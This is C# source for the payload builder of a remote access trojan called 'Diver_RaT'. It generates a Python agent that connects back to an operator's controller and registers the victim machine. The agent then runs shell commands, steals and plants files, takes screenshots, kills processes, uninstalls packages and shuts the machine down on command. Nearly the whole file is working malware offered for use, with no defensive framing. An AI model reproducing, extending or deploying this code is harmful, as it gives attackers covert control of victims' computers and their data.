using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class LinuxPayloadCreatorWindow : Window
    {
        public LinuxPayloadCreatorWindow()
        {
            InitializeComponent();
            IpTextBox.Text = string.IsNullOrWhiteSpace(ControllerSettings.Ip) ? GetLocalIpv4() : ControllerSettings.Ip;
            PortTextBox.Text = (ControllerSettings.Port + 2).ToString(System.Globalization.CultureInfo.InvariantCulture);
            OutputTextBox.Text = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "DiverPayloads");
        }

        private void BrowseButton_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new OpenFolderDialog { Title = "Select output folder" };
            if (dlg.ShowDialog(this) == true) OutputTextBox.Text = dlg.FolderName;
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e) => Close();

        private async void GenerateButton_Click(object sender, RoutedEventArgs e)
        {
            if (!Validate(out int port)) return;

            SetBusy(true);
            ProgressText.Text = "Generating Linux agent script...";
            BuildProgress.Visibility = Visibility.Visible;

            try
            {
                var outDir = OutputTextBox.Text.Trim();
                Directory.CreateDirectory(outDir);

                var fileName = SanitizeName(NameTextBox.Text) + ".py";
                var target = Path.Combine(outDir, fileName);

                var script = AgentScriptTemplate
                    .Replace("%%IP%%", IpTextBox.Text.Trim())
                    .Replace("%%PORT%%", port.ToString())
                    .Replace("%%HEARTBEAT%%", HeartbeatTextBox.Text.Trim());

                await File.WriteAllTextAsync(target, script, new System.Text.UTF8Encoding(false));

                ProgressText.Text = $"Done - created {target}";
                InfoText.Text = $"Copy {target} to a Linux machine and run it with:  python3 {fileName}\n" +
                                $"It connects to {IpTextBox.Text.Trim()}:{port}, registers, then appears in the Linux tab.";
            }
            catch (Exception ex)
            {
                ProgressText.Text = "Error: " + ex.Message;
            }
            finally
            {
                SetBusy(false);
            }
        }

        private bool Validate(out int port)
        {
            port = 0;
            if (string.IsNullOrWhiteSpace(IpTextBox.Text))
            {
                ProgressText.Text = "Enter the controller IP address.";
                return false;
            }
            if (!int.TryParse(PortTextBox.Text.Trim(), out port) || port is < 1 or > 65535)
            {
                ProgressText.Text = "Enter a valid TCP port (1-65535).";
                return false;
            }
            if (!int.TryParse(HeartbeatTextBox.Text.Trim(), out int hb) || hb < 1)
            {
                ProgressText.Text = "Enter a valid heartbeat interval in seconds.";
                return false;
            }
            return true;
        }

        private void SetBusy(bool busy)
        {
            GenerateButton.IsEnabled = !busy;
            BrowseButton.IsEnabled = !busy;
            CancelButton.Content = busy ? "Working..." : "Close";
            BuildProgress.Visibility = busy ? Visibility.Visible : Visibility.Collapsed;
        }

        private static string SanitizeName(string name)
        {
            var invalid = Path.GetInvalidFileNameChars();
            var clean = new string(name.Where(c => !invalid.Contains(c)).ToArray()).Trim();
            return string.IsNullOrWhiteSpace(clean) ? "agent" : clean;
        }

        private static string GetLocalIpv4()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                var ip = host.AddressList.FirstOrDefault(a =>
                    a.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(a));
                return ip?.ToString() ?? "127.0.0.1";
            }
            catch
            {
                return "127.0.0.1";
            }
        }

        private const string AgentScriptTemplate = """
        #!/usr/bin/env python3
        import base64, json, os, platform, socket, subprocess, threading, time, uuid

        HOST = "%%IP%%"
        PORT = %%PORT%%
        HB_MS = %%HEARTBEAT%%

        def get_id():
            try:
                with open("/etc/machine-id") as f:
                    return f.read().strip() + "-diver"
            except Exception:
                pass
            return "linux-" + uuid.uuid4().hex[:12]

        def get_user():
            try:
                return pwd.getpwuid(os.getuid()).pw_name
            except Exception:
                return os.environ.get("USER", "")

        def local_ip():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((HOST, 1))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception:
                return "0.0.0.0"

        def run(cmd, timeout=15):
            try:
                p = subprocess.run(["/bin/bash", "-c", cmd], capture_output=True, text=True, timeout=timeout)
                return p.stdout + p.stderr
            except Exception as ex:
                return str(ex)

        shell_proc = None
        shell_out = []
        shell_err = []
        shell_lock = threading.Lock()

        def _shell_drain(stream, queue):
            try:
                for line in iter(stream.readline, ""):
                    queue.append(line)
            except Exception:
                pass

        def _shell_ensure():
            global shell_proc, shell_out, shell_err
            if shell_proc is None or shell_proc.poll() is not None:
                shell_out = []
                shell_err = []
                try:
                    shell_proc = subprocess.Popen(
                        ["stdbuf", "-oL", "-eL", "/bin/bash", "--norc"],
                        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        text=True, bufsize=1)
                except FileNotFoundError:
                    shell_proc = subprocess.Popen(
                        ["/bin/bash", "--norc"],
                        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        text=True, bufsize=1)
                threading.Thread(target=_shell_drain, args=(shell_proc.stdout, shell_out), daemon=True).start()
                threading.Thread(target=_shell_drain, args=(shell_proc.stderr, shell_err), daemon=True).start()

        def shell(cmd, timeout=20):
            global shell_proc
            with shell_lock:
                _shell_ensure()
                marker = "__DIVERDONE" + uuid.uuid4().hex + "__"
                try:
                    shell_proc.stdin.write(cmd + "\n")
                    shell_proc.stdin.write("echo " + marker + "\n")
                    shell_proc.stdin.flush()
                except Exception as ex:
                    shell_proc = None
                    return "shell error: " + str(ex)
                deadline = time.time() + timeout
                out = []
                found = False
                while time.time() < deadline and not found:
                    while shell_out:
                        line = shell_out.pop(0)
                        if marker in line:
                            found = True
                            break
                        out.append(line)
                    if found:
                        break
                    while shell_err:
                        line = shell_err.pop(0)
                        if marker in line:
                            found = True
                            break
                        out.append(line)
                    if shell_proc.poll() is not None:
                        break
                    time.sleep(0.05)
                if found:
                    time.sleep(0.15)
                    while shell_out:
                        line = shell_out.pop(0)
                        if marker not in line:
                            out.append(line)
                    while shell_err:
                        line = shell_err.pop(0)
                        if marker not in line:
                            out.append(line)
                    return "".join(out).strip() or "(no output)"
                return "(timed out) " + "".join(out).strip()

        def list_dir(path):
            entries = []
            for name in sorted(os.listdir(path)):
                full = os.path.join(path, name)
                if os.path.isdir(full):
                    entries.append({"name": name, "kind": "Folder", "size": 0})
                else:
                    try:
                        size = os.path.getsize(full)
                    except Exception:
                        size = 0
                    entries.append({"name": name, "kind": "File", "size": size})
            return json.dumps({"path": os.path.abspath(path), "entries": entries})

        def list_drives():
            drives = [{"path": "/", "name": "/ (root)", "type": "Internal"}]
            for mp in ("/mnt", "/media", "/home"):
                try:
                    for sub in os.listdir(mp):
                        full = os.path.join(mp, sub)
                        if os.path.isdir(full):
                            drives.append({"path": full, "name": full, "type": "Volume"})
                except Exception:
                    pass
            return json.dumps(drives)

        def list_processes():
            out = run("ps -eo pid,comm --no-headers 2>/dev/null")
            arr = []
            for line in out.splitlines():
                parts = line.strip().split()
                if len(parts) >= 2 and parts[0].isdigit():
                    arr.append({"pid": int(parts[0]), "name": parts[1], "cpu": 0.0, "mem": 0.0, "title": ""})
            return json.dumps(arr)

        def list_apps():
            out = run("dpkg-query -W -f='${Package} ${Version}\\n' 2>/dev/null")
            arr = []
            for line in out.splitlines():
                sp = line.find(" ")
                if sp > 0:
                    arr.append({"name": line[:sp], "version": line[sp + 1:], "publisher": "", "installed": "", "sizeMb": 0.0})
            return json.dumps(arr)

        def screenshot():
            try:
                p = subprocess.run(["import", "-window", "root", "png:-"], capture_output=True, timeout=10)
                if p.returncode != 0:
                    p = subprocess.run(["scrot", "-o", "-"], capture_output=True, timeout=10)
                if p.stdout:
                    return True, base64.b64encode(p.stdout).decode()
                return False, "no screenshot tool (install imagemagick or scrot)"
            except Exception as ex:
                return False, str(ex)

        def handle(cmd, args):
            a = args or {}
            if cmd == "GET_INFO":
                return True, "host=%s;os=Linux;user=%s" % (platform.node(), get_user())
            if cmd == "PING":
                return True, "pong"
            if cmd == "SHELL":
                return True, shell(a.get("cmd", ""))
            if cmd == "LIST_DIR":
                return True, list_dir(a.get("path", "/"))
            if cmd == "LIST_DRIVES":
                return True, list_drives()
            if cmd == "LIST_PROCESSES":
                return True, list_processes()
            if cmd == "LIST_APPS":
                return True, list_apps()
            if cmd == "UNINSTALL_APP":
                pkg = a.get("package", "")
                if not pkg:
                    return False, "no package name"
                out = run("dpkg -r '%s' 2>&1 || rpm -e '%s' 2>&1" % (pkg, pkg))
                return True, "uninstall result: " + out.strip()
            if cmd == "LIST_SCREENS":
                return True, json.dumps([{"index": 0, "name": "Screen", "width": 0, "height": 0, "primary": True}])
            if cmd == "SCREENSHOT":
                return screenshot()
            if cmd == "TERMINATE_PROCESS":
                return True, run("kill -9 " + a.get("pid", "") + " 2>&1").strip()
            if cmd == "DOWNLOAD":
                with open(a.get("path", ""), "rb") as f:
                    return True, base64.b64encode(f.read()).decode()
            if cmd == "UPLOAD":
                with open(a.get("path", ""), "wb") as f:
                    f.write(base64.b64decode(a.get("data", "")))
                return True, "written to " + a.get("path", "")
            if cmd == "OPEN_URL":
                run("xdg-open '%s' >/dev/null 2>&1 &" % a.get("url", ""))
                return True, "opened"
            if cmd == "MESSAGE_BOX":
                t = a.get("text", "Hello")
                run("zenity --info --text='%s' 2>/dev/null || xmessage '%s' 2>/dev/null" % (t, t))
                return True, "shown"
            if cmd == "LOCK_SCREEN":
                run("loginctl lock-session 2>/dev/null || xdg-screensaver lock 2>/dev/null || gnome-screensaver-command -l 2>/dev/null")
                return True, "lock attempted"
            if cmd == "SHUTDOWN":
                run("shutdown -h now")
                return True, "shutdown initiated"
            if cmd == "RESTART":
                run("shutdown -r now")
                return True, "restart initiated"
            if cmd == "DISCONNECT":
                os._exit(0)
            return False, "command not implemented"

        def send(sock, obj):
            try:
                sock.sendall((json.dumps(obj) + "\n").encode())
            except Exception:
                pass

        def main():
            while True:
                try:
                    s = socket.create_connection((HOST, PORT), timeout=10)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    f = s.makefile("rb")
                    send(s, {"type": "REGISTER", "data": {
                        "id": get_id(), "hostname": platform.node(), "os": "Linux",
                        "username": get_user(), "country": "??", "deviceType": "Linux", "ip": local_ip()}})

                    def reader():
                        try:
                            while True:
                                line = f.readline()
                                if not line:
                                    break
                                if isinstance(line, bytes):
                                    line = line.decode("utf-8-sig", "replace")
                                try:
                                    msg = json.loads(line)
                                except Exception:
                                    continue
                                if msg.get("type") != "COMMAND":
                                    continue
                                try:
                                    ok, data = handle(msg.get("command"), msg.get("args"))
                                except Exception as ex:
                                    ok, data = False, str(ex)
                                send(s, {"type": "RESULT", "requestId": msg.get("requestId"),
                                        "command": msg.get("command"), "success": ok, "data": data})
                        except Exception:
                            pass

                    threading.Thread(target=reader, daemon=True).start()
                    while True:
                        time.sleep(HB_MS)
                        send(s, {"type": "HEARTBEAT"})
                except Exception:
                    pass
                time.sleep(5)

        if __name__ == "__main__":
            main()
        """;
    }
}